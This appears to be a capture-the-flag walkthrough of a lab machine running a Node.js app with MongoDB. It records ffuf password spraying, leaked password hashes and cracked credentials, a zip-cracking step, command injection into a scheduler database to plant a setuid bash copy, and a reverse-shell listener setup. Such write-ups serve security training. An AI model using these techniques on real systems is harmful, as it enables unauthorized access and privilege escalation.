```php
22/tcp   open  ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-tasktracker Apache Hadoop
| hadoop-tasktracker-info: 
|_  Logs: /login
| hadoop-datanode-info: 
|_  Logs: /login
```

Looks like we have some kind of web app on port 3000 - `http://10.129.183.100:3000/`
Lets do some fuzzing, our goal is to find a place to upload

```php
ffuf -u http://10.129.183.100:3000/FUZZ -w /home/drew/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -of html -o ffuf_scan.html -fc 404

gobuster dir -u http://10.129.183.100:3000 -w /home/drew/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --no-error -o gobuster.txt
```

looks like directory busting is a no go for us

```php
http://10.129.183.100:3000/login
```

We do have this login page
I test it on incognito, there appears to be no rate limiting when attempting to login so lets hop on burp suite and try a password spray attack

```php
ffuf -w /home/drew/tools/SecLists/Usernames/top-usernames-shortlist.txt:USER -w /home/drew/tools/SecLists/Passwords/Common-Credentials/10k-most-common.txt:PASS \
     -X POST \
     -H "Content-Type: application/json" \
     -H "Accept: application/json" \
     -d '{"username":"USER","password":"PASS"}' \
     -u http://10.129.183.100:3000/api/session/authenticate \
     -fc 401,403
```

```php
ffuf -w /home/drew/tools/SecLists/Usernames/top-usernames-shortlist.txt:USER \
     -w /home/drew/tools/SecLists/Passwords/Common-Credentials/10k-most-common.txt:PASS \
     -X POST \
     -H "Content-Type: application/json" \
     -H "Accept: application/json" \
     -d '{"username":"USER","password":"PASS"}' \
     -u http://10.129.183.100:3000/api/session/authenticate \
     -mr "token"
```

```php
ffuf -w /home/drew/tools/SecLists/Usernames/top-usernames-shortlist.txt:USER \
     -w /home/drew/tools/SecLists/Passwords/Common-Credentials/10k-most-common.txt:PASS \
     -X POST \
     -H "Content-Type: application/json" \
     -H "Accept: application/json" \
     -d '{"username":"USER","password":"PASS"}' \
     -u http://10.129.183.100:3000/api/session/authenticate \
     -fs 48
```

```php
ffuf -w /home/drew/tools/SecLists/Usernames/xato-net-10-million-usernames.txt:USER \
     -w /home/drew/tools/SecLists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt:PASS \
     -X POST \
     -H "Content-Type: application/json" \
     -H "Accept: application/json" \
     -d '{"username":"USER","password":"PASS"}' \
     -u http://10.129.183.100:3000/api/session/authenticate \
     -fs 48
```

```php
ffuf -w /home/drew/tools/SecLists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt:PASS \
     -X POST \
     -H "Content-Type: application/json" \
     -H "Accept: application/json" \
     -d '{"username":"admin","password":"PASS"}' \
     -u http://10.129.183.100:3000/api/session/authenticate \
     -fs 48

```

Lets view the source code and explore the files
```php
http://10.129.183.100:3000/assets/js/app/controllers/home.js
```

We find an end point `/api/users/latest` that shows all recent users

```php
f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240:spongebob
de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73:snowflake

tom:spongebob
mark:snowflake
```

We have logged in successfully as tom and mark

Playing around with end points I found `http://10.129.183.100:3000/api/users`
This revealed to use a log of an admin

```php
[{"_id":"59a7365b98aa325cc03ee51c","username":"myP14ceAdm1nAcc0uNT","password":"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af","is_admin":true}
```

```php
myP14ceAdm1nAcc0uNT:manchester
```

We are greeted with a button that lets us download a backup file `myplace.backup`

```
fcrackzip -v -u -D -p /home/drew/tools/SecLists/Passwords/Leaked-Databases/rockyou.txt decoded.backup
```

```
fcrackzip -v -u -D -p ~/rockyou.txt decoded.backup
PASSWORD FOUND!!!!: pw == magicword
unzip -P magicword decoded.backup -d myplace_contents
ls -R myplace_contents/
```

Exploring the contents of `App.js`

```php
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';

mark:5AYRft73VtFpc84k
```

```
ssh mark@10.129.183.100
5AYRft73VtFpc84k
```

```php
              .-. 
        .-'``(|||) 
     ,`\ \    `-`.                 88                         88 
    /   \ '``-.   `                88                         88 
  .-.  ,       `___:      88   88  88,888,  88   88  ,88888, 88888  88   88 
 (:::) :        ___       88   88  88   88  88   88  88   88  88    88   88 
  `-`  `       ,   :      88   88  88   88  88   88  88   88  88    88   88 
    \   / ,..-`   ,       88   88  88   88  88   88  88   88  88    88   88 
     `./ /    .-.`        '88888'  '88888'  '88888'  88   88  '8888 '88888' 
        `-..-(   ) 
              `-` 




The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Sep 27 02:33:14 2017 from 10.10.14.3
mark@node:~$ 
```

```php
ps aux
tom       1288  0.0  6.1 1008568 46384 ?       Ssl  16:53   0:01 /usr/bin/node /
```

```php
ps aux | grep tom
tom       1288  0.0  6.1 1008568 46912 ?       Ssl  16:53   0:01 /usr/bin/node /var/scheduler/app.js
tom       1297  4.3  8.1 1242856 61804 ?       Ssl  16:53   9:12 /usr/bin/node /var/www/myplace/app.js
mark      1978  0.0  0.1  11284  1016 pts/2    S+   20:26   0:00 grep --color=auto tom

/usr/bin/node /var/scheduler/app.js
/var/scheduler/app.js
```

```php
mongo -p u mark scheduler
> db.tasks.insert({"cmd":"/bin/cp /bin/bash /tmp/tom; /bin/chown tom:admin /tmp/tom; chmod g+s /tmp/tom; chmod u+s /tmp/tom"});
WriteResult({ "nInserted" : 1 })
```

```php
cd /tmp

mark@node:/tmp$ ./tom -p
tom-4.3$ id
uid=1001(mark) gid=1001(mark) euid=1000(tom) egid=1002(admin) groups=1002(admin),1001(mark)
tom-4.3$ 
```

wget revshell

python -m http.server 8081

nc -nvlp 4444
Listening on 0.0.0.0 4444

Connection received on 10.129.183.100 35684
mark@node:/tmp$ whoami
whoami
mark

./tom -p 
tom-4.3$ id
uid=1001(mark) gid=1001(mark) euid=1000(tom) egid=1002(admin) groups=1002(admin),1001(mark)

mark@node:/tmp$ ls -l
ls -l
total 1028
srwx------ 1 mongodb nogroup       0 Jun  4 16:53 mongodb-27017.sock
-rwxrwxr-x 1 tom     admin        43 Jun  4 20:47 revshell.sh
drwx------ 3 root    root       4096 Jun  4 16:53 systemd-private-464ee4fd10274bd8850a0a78edb46bd3-systemd-timesyncd.service-RVqBDG
-rwsr-sr-x 1 tom     admin   1037528 Jun  4 20:43 tom
drwx------ 2 root    root       4096 Jun  4 16:53 vmware-root

executing as tom will give us an admin shell